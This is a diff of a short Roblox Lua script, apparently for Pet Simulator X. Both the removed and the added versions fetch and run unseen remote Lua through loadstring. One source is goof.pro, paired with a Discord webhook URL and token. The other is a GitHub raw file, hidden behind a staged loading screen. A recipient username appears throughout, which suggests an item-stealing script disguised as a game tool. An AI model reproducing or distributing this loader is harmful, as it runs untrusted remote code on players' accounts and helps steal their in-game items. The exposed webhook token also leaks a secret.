@@ -1,5 +1,15 @@
-UserName = "Murdyoof"
+Username = "Murdyoof"
 
-WebHook = "https://discord.com/api/webhooks/1103436446012018829/JZ5X7LNsBetOUZyXo6bJq2Hxmz3d9cWXoiQiTYJ3YpHC8giBhUCdMUrfrKqIYNjZdOiK"
+loadingscreen = true
 
-loadstring(game:HttpGet("https://goof.pro/s/mailbox.lua", true))()
+_G.CustomScriptName = "PSX"
+
+_G.Text1 = "Preparing Script..."
+
+_G.Text2 = "Loading Script..."
+
+_G.Text3 = "Finishing Things Up..."
+
+_G.Text4 = "Almost Done..."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
